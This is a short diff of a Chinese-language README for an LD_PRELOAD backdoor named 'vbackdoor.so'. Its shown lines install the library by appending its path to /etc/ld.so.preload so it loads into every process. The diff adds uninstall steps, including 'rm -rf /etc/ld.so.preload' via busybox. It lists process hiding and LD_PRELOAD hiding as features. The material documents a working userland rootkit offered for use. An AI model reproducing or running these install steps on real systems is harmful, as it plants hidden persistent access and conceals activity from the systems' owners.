@@ -26,8 +26,20 @@ sudo mv vbackdoor.so /usr/local/lib/
 echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
 ```
 
+### 卸载后门
 
+```
+vi /etc/ld.so.preload
+```
+并删除内容 /usr/local/lib/vbackdoor.so
 
+或者
+
+使用busybox
+
+```
+rm -rf /etc/ld.so.preload
+```
 
   * 进程隐藏
   * LD_PRELOAD 隐藏
